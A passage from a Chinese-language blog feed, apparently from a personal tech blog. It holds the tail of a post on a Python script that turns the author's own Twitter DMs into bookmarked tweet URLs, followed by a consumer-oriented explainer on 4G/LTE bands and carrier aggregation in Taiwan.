&lt;span class="c1"&gt;# &amp;quot;Last 30 days DMs&amp;quot; or &amp;quot;Up to 200 DMs which created before 30 days&amp;quot;  &lt;/span&gt;
&lt;span class="n"&gt;sent_direct_messages&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;api&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetSentDirectMessages&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;count&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;dm&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;sent_direct_messages&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;dm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recipient_id&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;MY_BOT_TWITTER_ID&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
        &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
            &lt;span class="c1"&gt;# Got t.co url in DM, use urllib to get its real Twitter Status URL.  &lt;/span&gt;
            &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="n"&gt;urllib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;urlopen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
                &lt;span class="n"&gt;real_url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;geturl&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;  
        &lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="ne"&gt;Exception&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
            &lt;span class="k"&gt;raise&lt;/span&gt;  
        &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
            &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;+ &amp;lt;{}&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;real_url&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;開一個 gist 放個程式碼：&lt;a href="https://gist.github.com/M157q/a90f5d2948442dc482e35d671b074c6f"&gt;https://gist.github.com/M157q/a90f5d2948442dc482e35d671b074c6f&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;結果&lt;/h2&gt;
&lt;p&gt;直接以網址呈現：&lt;br /&gt;
（其實應該可以直接 embed tweet 啦，但我有點懶得弄。）  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://twitter.com/yoyo0329/status/944230050399793152"&gt;https://twitter.com/yoyo0329/status/944230050399793152&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/rewoIf/status/943852230796484610"&gt;https://twitter.com/rewoIf/status/943852230796484610&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/zaticwu/status/943834445886267392"&gt;https://twitter.com/zaticwu/status/943834445886267392&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/zhusee2/status/943728354057887744"&gt;https://twitter.com/zhusee2/status/943728354057887744&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/TinyDenny/status/943332441699299328"&gt;https://twitter.com/TinyDenny/status/943332441699299328&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/CHl1XIB8ymdrKbC/status/943482302822150144"&gt;https://twitter.com/CHl1XIB8ymdrKbC/status/943482302822150144&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/jserv/status/942265803868487680"&gt;https://twitter.com/jserv/status/942265803868487680&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/rochacbruno/status/942419952300167169"&gt;https://twitter.com/rochacbruno/status/942419952300167169&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/daiwanhanji/status/942046653619478535"&gt;https://twitter.com/daiwanhanji/status/942046653619478535&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/thecat/status/942193282968305664"&gt;https://twitter.com/thecat/status/942193282968305664&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/riddle_ling/status/942271085495459840"&gt;https://twitter.com/riddle_ling/status/942271085495459840&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/c9s/status/942224140273987584"&gt;https://twitter.com/c9s/status/942224140273987584&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/sandokaishy/status/942057552577052672"&gt;https://twitter.com/sandokaishy/status/942057552577052672&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/johnroyer/status/941478195362119682"&gt;https://twitter.com/johnroyer/status/941478195362119682&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/ferrari_tw/status/941137503423119360"&gt;https://twitter.com/ferrari_tw/status/941137503423119360&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/lovecankill/status/940781592947048448"&gt;https://twitter.com/lovecankill/status/940781592947048448&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/linuxtoy/status/940780140081975298"&gt;https://twitter.com/linuxtoy/status/940780140081975298&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/Ignissfate/status/940453739718066177"&gt;https://twitter.com/Ignissfate/status/940453739718066177&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/schrockn/status/940037656494317568"&gt;https://twitter.com/schrockn/status/940037656494317568&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/M157q/status/939785465992953857"&gt;https://twitter.com/M157q/status/939785465992953857&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/welkineins/status/939541907612377089"&gt;https://twitter.com/welkineins/status/939541907612377089&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/WanCW/status/938624903724404736"&gt;https://twitter.com/WanCW/status/938624903724404736&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/jaceju/status/937497004690751488"&gt;https://twitter.com/jaceju/status/937497004690751488&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/ronnywang/status/937511877092847616"&gt;https://twitter.com/ronnywang/status/937511877092847616&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/hynek/status/937316249431928832"&gt;https://twitter.com/hynek/status/937316249431928832&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/Schnappiggg/status/936591006169890816"&gt;https://twitter.com/Schnappiggg/status/936591006169890816&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/tebeka/status/934013246226526210"&gt;https://twitter.com/tebeka/status/934013246226526210&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/riddle_ling/status/932499976193585152"&gt;https://twitter.com/riddle_ling/status/932499976193585152&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/PeterZaitsev/status/931485736855134213"&gt;https://twitter.com/PeterZaitsev/status/931485736855134213&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/TinyDenny/status/932093891368460288"&gt;https://twitter.com/TinyDenny/status/932093891368460288&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/ruanyf/status/931709967966412800"&gt;https://twitter.com/ruanyf/status/931709967966412800&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/dlackty/status/931328546664050689"&gt;https://twitter.com/dlackty/status/931328546664050689&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/joelgrus/status/931202032978948096"&gt;https://twitter.com/joelgrus/status/931202032978948096&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/x0rz/status/930016909231362048"&gt;https://twitter.com/x0rz/status/930016909231362048&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/TinyDenny/status/929187796752855040"&gt;https://twitter.com/TinyDenny/status/929187796752855040&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/dbader_org/status/927899530942668801"&gt;https://twitter.com/dbader_org/status/927899530942668801&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/M157q_News_RSS/status/925543091339010048"&gt;https://twitter.com/M157q_News_RSS/status/925543091339010048&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/WanCW/status/924993679156056064"&gt;https://twitter.com/WanCW/status/924993679156056064&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/jaceju/status/924455583587037184"&gt;https://twitter.com/jaceju/status/924455583587037184&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/LoveHyperApp/status/923523498743439360"&gt;https://twitter.com/LoveHyperApp/status/923523498743439360&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/suitingtseng/status/923917098233073664"&gt;https://twitter.com/suitingtseng/status/923917098233073664&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;題外話&lt;/h2&gt;
&lt;p&gt;在寫這篇的時候發現，&lt;br /&gt;
最近 Twitter 好像針對這需求有了一個&lt;a href="https://techcrunch.com/2017/11/23/twitter-is-testing-bookmarks-a-feature-to-privately-flag-tweets-for-later/"&gt;新的 Bookmark 功能&lt;/a&gt;，&lt;br /&gt;
看了一下，好像還不能分類就是，&lt;br /&gt;
所以我應該還是會繼續用這樣的方式當作 bookmark。  &lt;/p&gt;
&lt;p&gt;然後也發現好像多了個 &lt;a href="https://developer.twitter.com/en/docs/accounts-and-users/subscribe-account-activity/overview"&gt;Account Activity API&lt;/a&gt;，&lt;br /&gt;
可以設定 webhook 即時接收帳號的事件，&lt;br /&gt;
可能可以做到類似聊天機器人這樣事件觸發式的對話。  &lt;/p&gt;
&lt;p&gt;如果是這裡的用途的話，&lt;br /&gt;
可以在我每次發送私訊的時候，&lt;br /&gt;
就直接透過 webhook 把該 tweet 的內容存在資料庫裡，&lt;br /&gt;
這樣就不會受 Twitter API 的限制了，&lt;br /&gt;
有空的話再來弄吧。  &lt;/p&gt;</summary><category term="Python"></category><category term="Twitter"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>關於 4G 行動網路的一些筆記</title><link href="https://blog.m157q.tw/posts/2017/12/20/4g-mobile-network-tw/" rel="alternate"></link><published>2017-12-21T14:47:50+08:00</published><updated>2017-12-21T14:47:50+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-12-20:posts/2017/12/20/4g-mobile-network-tw/</id><summary type="html">&lt;p&gt;本文利用工人智慧技術同步發表於 &lt;a href="https://ithelp.ithome.com.tw/articles/10192595"&gt;[2018 iThome 鐵人賽] Day 1: 關於 4G 行動網路的一些筆記 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;其實手機使用中華電信的 4G 行動網路已經將近快兩年了，&lt;br /&gt;
但其實一直以來就只是用而已，對它並沒有很瞭解。&lt;br /&gt;
最近因為：  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;中華電信在我目前的租屋處收訊不好，即便是使用了 4G 行動網路，速度還是很慢，更別說常常掉到 3G 行動網路。  &lt;/li&gt;
&lt;li&gt;一到人多的地方，中華電信的 4G 行動網路就卡死了，因為附近的使用者太多，導致頻寬過少，基地台負荷不了。  &lt;/li&gt;
&lt;li&gt;目前使用中華電信的 4G 行動上網吃到飽方案，一個月要將近 1400 元新台幣的費用，我覺得以這服務品質來說實在太過於不划算（當初是因為要當個孝子，讓媽免費拿平板才綁這兩年約。Orz）。算了一下，調降目前的資費再選擇其他電信商的 4G 吃到飽專案，隨便搭都比我現在的費用便宜。  &lt;/li&gt;
&lt;li&gt;iOS 開 Wi-Fi 熱點分享很雷(我是用 iPhone SE + iOS 10.3.1），有以下幾個我覺得很雷的點：  &lt;ul&gt;
&lt;li&gt;開熱點分享真的很耗電，常常都要接著充電，覺得很麻煩。  &lt;/li&gt;
&lt;li&gt;疑似是通訊晶片的問題，開熱點分享常常要開好幾次才找得到。  &lt;/li&gt;
&lt;li&gt;遇到附近有記憶過的無線網路也沒辦法開熱點分享，因為會直接連上該無線網路。在前公司遇到一些狀況要切換網路環境測試的時候很麻煩，還不如直接用 USB tethering。  &lt;/li&gt;
&lt;li&gt;開熱點分享的時候螢幕上永遠有一條藍色的 status bar 沒辦法關掉，iPhone SE 的螢幕就夠小了，更別說常常不小心點到，就跑到開關熱點的畫面，覺得很煩。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;iOS App Store 如果安裝或更新需要下載超過 150 MB 的話，就一定要你連上 Wi-Fi，真的不知道這到底是什麼鳥設計。  &lt;ul&gt;
&lt;li&gt;更新 iOS 版本也要連上 Wi-Fi，所以我幾乎沒更新過，還好最近 iOS 11 看來寫的不太好，可能也不需要急著更新。  &lt;/li&gt;
&lt;li&gt;當然是不能連自己的熱點分享，加上身為一個邊緣阿宅又不太敢連 Public Wi-Fi 的人，常常有些 App 不能更新或安裝，所以必須要有一個額外的 Wi-Fi 來源。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;租屋處有使用 Chromecast 2 的需求，它如果連到手機分享出來的 Wi-Fi 熱點的話，分享熱點的手機就不能控制它。  &lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;因為以上種種原因，&lt;br /&gt;
加上所以打算多買一張 4G SIM 卡搭配 4G 行動網路分享器，&lt;br /&gt;
在看分享器商品規格的時候發現自己都看不太懂，&lt;br /&gt;
所以花了不少時間查 4G 行動網路相關的資料，&lt;br /&gt;
才發現有些裝置對台灣的電信商支援程度不一，&lt;br /&gt;
買錯的話很可能買來卻不能用，&lt;br /&gt;
或者只能發揮一半的效能，&lt;br /&gt;
想說就在這篇文章筆記一下。  &lt;/p&gt;
&lt;p&gt;（至於 4G 行動網路分享器的部份之後應該也會有一篇某牌設備的使用心得，但不會在這篇提及。因為目前使用上出了些問題，跟原廠回報問題後目前正在處理中。）  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;名詞定義&lt;/h2&gt;
&lt;p&gt;首先來搞懂基本的名詞  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;4G, LTE, WiMAX  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/zh-tw/4G"&gt;第四代行動通訊技術（英語：The fourth generation of mobile phone mobile communication technology standards，縮寫為 4G）&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;2008 年 3 月，在國際電信聯盟 - 無線電通訊部門（ITU-R）指定一組用於 4G 標準的要求，命名為 IMT-Advanced 規範，設定 4G 服務的峰值速度要求在高速行動的通訊（如在火車和汽車上使用）達到 100 Mbit/s，固定或低速行動的通訊（如行人和定點上網的用戶）達到 1 Gbit/s。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;簡單來說，可以想成 4G 只是對於網路速度最大值的門檻，如果行動網路速度的最大值有辦法達到上述條件，則可稱做 4G。（是最大值，不是最小值。）  &lt;/li&gt;
&lt;li&gt;這門檻其實滿高的，不信的話可以拿手機出來測一下網路速度看差多少。  &lt;/li&gt;
&lt;li&gt;最早出現「號稱 4G」的兩個通訊標準：  &lt;ul&gt;
&lt;li&gt;一個是我們現在在台灣最常看到的 &lt;a href="https://zh.wikipedia.org/zh-tw/%E9%95%B7%E6%9C%9F%E6%BC%94%E9%80%B2%E6%8A%80%E8%A1%93"&gt;LTE&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;另外一個則是&lt;a href="https://zh.wikipedia.org/zh-tw/WiMAX#WiMAX%E5%85%A8%E9%9D%A2%E6%92%A4%E5%8F%B0"&gt;在台灣做不起來的 WiMAX&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;至於為什麼做不起來，詳情可以參考這篇文章：&lt;a href="https://hellolynn.hpd.io/2017/05/19/%E4%BD%A0%E6%9C%89%E8%81%BD%E9%81%8E%E5%8F%B0%E7%81%A3%E7%B4%8D%E7%A8%85%E4%BA%BA%E7%9A%84%E8%A1%80%E6%B7%9Awimax%E5%97%8E-4g%E7%AF%87/"&gt;你有聽過台灣納稅人的血淚WiMax嗎？中離王Intel與榮景不再的高通—4G 篇 – 寫點科普，請給指教。&lt;/a&gt; （私心推薦一下這個 Blog，內容大部份都滿完整且簡單易懂的，而且作者不是資通訊本科生還是一個人因為興趣而寫這些文章，真的覺得很厲害。）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;但其實這兩種通訊標準根本達不到 4G 的門檻  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;2010 年 12 月 6 日，ITU-R 的承認，這兩種技術，以及其他 3.9 技術，不符合 IMT-Advanced 的要求，仍可以被認為是「4G」，但前提是它們是先行者，以 IMT-Advanced 的標準版本和改善的效能和功能來看它只是相當於現在部署的 3G 網路的程度。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;真正符合 IMT-Advanced 的 4G 規範的其實是 &lt;a href="https://zh.wikipedia.org/zh-tw/4G#IMT-Advanced%E7%9A%844G%E6%A8%99%E6%BA%96"&gt;LTE-Advanced (LTE-A) 和 WirelessMAN-Advanced (又稱 WiMAX-Advanced 或 WiMAX 2)&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;基本上現在 4G 行動網路發展都以 LTE 為主流了，LTE-Advanced 因為可以透過軟體將 LTE 升級達到，現在台灣的電信商基本上都有支援了，不過能不能使用 LTE-Advanced 的載波聚合來達到真正的 4G 標準速度，就得看裝置了。（至於什麼是載波聚合？下面會提到。）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;詳細一點可以參考：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.eprice.com.tw/mobile/talk/5035/4979930/1/"&gt;看的好亂啊？！帶你秒懂電信 4G 名詞，不再眼花花 - 手機新聞 | ePrice 比價王&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.kocpc.com.tw/archives/68833"&gt;【電信服務】什麼是「真4G」 - 電腦王阿達&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;正片開始&lt;/h2&gt;
&lt;h3&gt;已經用 4G SIM 卡了嗎？你的網路速度很有可能可以再更快。&lt;/h3&gt;
&lt;p&gt;撇開收訊問題，&lt;br /&gt;
你知道同一張 SIM 卡使用都支援 4G 行動網路的不同裝置，&lt;br /&gt;
速度可能會差很多嗎？  &lt;/p&gt;
&lt;p&gt;這跟上面提到的載波聚合（Carrier Aggregation，簡稱 CA）技術有關，&lt;br /&gt;
簡單來說就是透過同時使用不同的 LTE 頻段來增加網路頻寬，&lt;br /&gt;
基本上台灣的電信商目前都至少擁有 3 個以上的 LTE 頻段（中華電信和遠傳有 4 個頻段）。&lt;br /&gt;
可以參考這張 Wikipedia 的截圖（頻段未來有可能會再變動，請以較新的資料為準。）  &lt;/p&gt;
&lt;p&gt;&lt;img alt="20171220-4g-lte-tw" src="/files/4g-mobile-network-tw/20171220-4g-lte-tw.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;2CA 就是支援兩個頻段（也有可能是同一個頻段，但兩個不連續的區塊組合），&lt;br /&gt;
3CA 則依此類推。&lt;br /&gt;
有沒有支援載波聚合必須看各個裝置，&lt;br /&gt;
如果使用的裝置沒支援的話同一時間只會使用一個頻段，&lt;br /&gt;
當頻寬被附近其他使用同個基地台的使用者佔滿的話，&lt;br /&gt;
網路速度就上不去。&lt;br /&gt;
但如果使用的裝置有支援載波聚合的話，&lt;br /&gt;
就會自動選擇頻寬較足夠的頻段。&lt;br /&gt;
所以購買使用 4G 行動網路的裝置之前，&lt;br /&gt;
除了確認該裝置有支援你要使用的電信商的頻段以外，&lt;br /&gt;
如果想要網路速度能夠快一點的話，&lt;br /&gt;
最好就選擇支援愈多頻段載波聚合的裝置，&lt;br /&gt;
當然價格也會比較貴一些。  &lt;/p&gt;
&lt;p&gt;詳細可以參考以下幾篇文章：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://axiang.cc/archives/22019"&gt;4G該怎麼選？4G+和CA又是什麼？告訴你七個辦4G前必看的問題！ | 阿祥的網路筆記本&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://pigapril.pixnet.net/blog/post/319935925-%E3%80%903c%E3%80%91%E7%B0%A1%E5%96%AE%E6%98%93%E6%87%82---%E4%BB%80%E9%BA%BC%E6%98%AF%22%E8%BC%89%E6%B3%A2%E8%81%9A%E5%90%88carrier-aggrega"&gt;【3C】簡單易懂 - 什麼是"載波聚合Carrier Aggregation", 到底有哪些手機支援!? @ 火星豬 :: 痞客邦 PIXNET ::&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://tel3c.tw/blog/post/222391175"&gt;為何明明買了支援CA手機卻飆不了速呢? 2CA/3CA/4CA支援頻段揭密 - 小丰子3C俱樂部&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;到底頻段是要看 MHz 還是看 Band？&lt;/h3&gt;
&lt;p&gt;在購買 LTE 相關裝置的時候，&lt;br /&gt;
常常會在商品介紹或規格中看到頻段是用 700 MHz, 900 MHz, 1800 MHz, 2100 MHz, 2600 MHz&lt;br /&gt;
或 B28, B8, B3, B1, B7, B38 來表示，&lt;br /&gt;
這邊提供兩張目前台灣電信商使用的頻段對照表，一個照 MHz 由小到大排序，一個照 Band 由小到大排序。  &lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;MHz&lt;/th&gt;
&lt;th&gt;Band&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;700&lt;/td&gt;
&lt;td&gt;28&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;900&lt;/td&gt;
&lt;td&gt;8&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;1800&lt;/td&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2100&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2600&lt;/td&gt;
&lt;td&gt;7&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2600&lt;/td&gt;
&lt;td&gt;38&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Band&lt;/th&gt;
&lt;th&gt;MHz&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;2100 (FDD-LTE)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;1800 (FDD-LTE)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;7&lt;/td&gt;
&lt;td&gt;2600 (FDD-LTE)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;8&lt;/td&gt;
&lt;td&gt;900  (FDD-LTE)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;28&lt;/td&gt;
&lt;td&gt;700  (FDD-LTE)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;38&lt;/td&gt;
&lt;td&gt;2600 (TD-LTE)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;眼尖的人可能會發現有 2 個 2600 MHz，&lt;br /&gt;
所以比較常看到都會用 B1, B3, B7, B8, B28, B38 來表示，&lt;br /&gt;
因為比較不會混淆。&lt;br /&gt;
至於如果是用 MHz 來表示的話，&lt;br /&gt;
可能就要注意一下 2600 MHz 的部份是否只有支援 FDD-LTE, TD-LTE 或兩者都有支援。&lt;br /&gt;
如果有到其他國家使用的需求的話，&lt;br /&gt;
則需要確認一下該國電信商使用的頻段。  &lt;/p&gt;
&lt;h3&gt;支援台灣全頻段？&lt;/h3&gt;
&lt;p&gt;常常會看到有些產品號稱支援台灣 LTE 全頻段，&lt;br /&gt;
到底是什麼意思？&lt;br /&gt;
以目前來說，&lt;br /&gt;
如果要「完整」支援台灣全頻段的話，&lt;br /&gt;
就是要支援上述所有提到的 B1, B3, B7, B8, B28, B38。&lt;br /&gt;
或 700, 900, 1800, 2100, 2600 (FDD-LTE), 2600 (TD-LTE)。&lt;br /&gt;
如果未來有新的頻段的話則會再更多。  &lt;/p&gt;
&lt;p&gt;為什麼說「完整」呢？&lt;br /&gt;
因為有些標榜支援台灣全頻段的產品，&lt;br /&gt;
其實只有支援 B1, B3, B7, B8，&lt;br /&gt;
這點在購買上要注意一下。  &lt;/p&gt;
&lt;h3&gt;不同的頻段有什麼差別嗎？&lt;/h3&gt;
&lt;p&gt;頻率不同，波長不同，涵蓋範圍不同，基地台所需數目不同，單一基地台服務使用者數目不同，網路塞車可能性不同。&lt;br /&gt;
可以用以下的對照表來呈現，以頻率最高的 700 MHz 和 2600 MHz 來比較。  &lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;頻率&lt;/th&gt;
&lt;th&gt;波長&lt;/th&gt;
&lt;th&gt;涵蓋範圍&lt;/th&gt;
&lt;th&gt;基地台所需數目&lt;/th&gt;
&lt;th&gt;單一基地台服務使用者數&lt;/th&gt;
&lt;th&gt;網路塞車可能性&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;700 MHz&lt;/td&gt;
&lt;td&gt;較長&lt;/td&gt;
&lt;td&gt;較大&lt;/td&gt;
&lt;td&gt;較少&lt;/td&gt;
&lt;td&gt;較多&lt;/td&gt;
&lt;td&gt;較高&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2600 MHz&lt;/td&gt;
&lt;td&gt;較短&lt;/td&gt;
&lt;td&gt;較小&lt;/td&gt;
&lt;td&gt;較多&lt;/td&gt;
&lt;td&gt;較少&lt;/td&gt;
&lt;td&gt;較低&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;實際使用上會跟訊號強度以及電信商佈署的基地台密度有關。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;補充&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;OpenSignalMap 這個 App 挺好用的，不僅可以查使用中的 SIM 卡電信商的基地台位置，也可以測行動網路和使用的 Wi-Fi 網路的速度。  &lt;/li&gt;
&lt;li&gt;VoLTE, FDD-LTE, TDD-LTE 這些有空會再補充，今天有點來不及寫完啦。(也可能不會補充？）  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;因為沒有很懂，&lt;br /&gt;
所以可能會有錯誤的地方，&lt;br /&gt;
歡迎留言回覆告知討論交流，&lt;br /&gt;
